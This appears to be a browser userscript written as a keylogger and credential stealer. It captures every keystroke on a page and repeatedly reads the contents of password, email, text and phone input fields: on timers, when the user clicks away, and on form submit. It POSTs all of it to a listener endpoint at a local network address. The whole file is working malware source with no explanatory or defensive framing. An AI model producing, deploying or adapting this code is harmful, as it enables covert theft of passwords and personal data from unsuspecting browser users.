(function() {
    'use strict';

    const LISTENER_URL = 'http://172.17.0.1:3000/log-keystrokes';

    const USER_DELAY = 5000;
    const PASS_DELAY = 10000;
    const TYPING_DELAY = 1500;

    let keyBuffer = '';
    let typingTimer;
    let activeFieldTimer = null;

    function sendData(data) {
        console.log("SENDING TO SERVER:", data);
        GM_xmlhttpRequest({
            method: "POST",
            url: LISTENER_URL,
            headers: { "Content-Type": "application/json" },
            data: JSON.stringify({ key: data }),
            onload: function(response) {},
            onerror: function(err) { console.error("Connection failed.", err); }
        });
    }

    window.addEventListener('keydown', function(event) {
        let key = event.key;

        if (key === ' ') key = ' ';
        else if (key === 'Enter') key = ' [ENTER] \n';
        else if (key === 'Backspace') key = '[<]';
        else if (key === 'Tab') key = ' [TAB] ';
        else if (key.length > 1) return;

        keyBuffer += key;

        clearTimeout(typingTimer);
        typingTimer = setTimeout(flushBuffer, TYPING_DELAY);
    }, true);

    function flushBuffer() {
        if (keyBuffer.length === 0) return;
        sendData(`<Typing> ${keyBuffer}`);
        keyBuffer = '';
    }

    document.addEventListener('focusin', function(event) {
        let el = event.target;
        if (!el || el.tagName !== 'INPUT') return;

        let type = el.type ? el.type.toLowerCase() : 'text';
        let timeout = 0;

        if (type === 'password') {
            timeout = PASS_DELAY;
            console.log("Password box focused. Timer set for", timeout, "ms");
        } else if (type === 'email' || type === 'text' || type === 'tel') {
            timeout = USER_DELAY;
            console.log("Username box focused. Timer set for", timeout, "ms");
        }

        if (timeout > 0) {
            clearTimeout(activeFieldTimer);

            const dumpField = () => {
                if (document.activeElement !== el) {
                    console.log("User clicked away. Timer cancelled.");
                    return;
                }

                let val = el.value;
                if (val.trim() !== '') {
                    console.log("TIMEOUT REACHED! Dumping value:", val);
                    if (type === 'password') {
                        sendData(`\n\n[TIMEOUT DUMP] password:- <${val}>\n\n`);
                    } else {
                        sendData(`\n\n[TIMEOUT DUMP] ${type}:- <${val}>\n\n`);
                    }
                } else {
                    console.log("Timeout reached, but box is empty.");
                }

                activeFieldTimer = setTimeout(dumpField, timeout);
            };

            activeFieldTimer = setTimeout(dumpField, timeout);
        }
    }, true);

    document.addEventListener('focusout', function(event) {
        clearTimeout(activeFieldTimer);
    }, true);

    document.addEventListener('focusout', function(event) {
        let el = event.target;
        if (el && el.tagName === 'INPUT' && el.value.trim() !== '') {
            let type = el.type ? el.type.toLowerCase() : 'text';
            let name = el.name || el.id || 'unknown_field';
            let value = el.value;

            if (type === 'password') {
                sendData(`\n\n[CLICKED AWAY] password:- <${value}>\n\n`);
            } else if (type === 'email' || type === 'text' || type === 'tel') {
                sendData(`\n\n[CLICKED AWAY] ${type}:- <${value}>\n\n`);
            }

            keyBuffer = '';
            clearTimeout(typingTimer);
        }
    }, true);

    document.addEventListener('submit', function(event) {
        let form = event.target;
        let inputs = form.querySelectorAll('input');

        inputs.forEach(function(el) {
            if (el.value.trim() !== '' && (el.type === 'password' || el.type === 'email' || el.type === 'text')) {
                if (el.type === 'password') {
                    sendData(`\n[FORM SUBMIT] password:- <${el.value}>\n`);
                } else {
                    sendData(`\n[FORM SUBMIT] ${el.type}:- <${el.value}>\n`);
                }
            }
        });
    }, true);

    window.addEventListener('beforeunload', flushBuffer);

})();
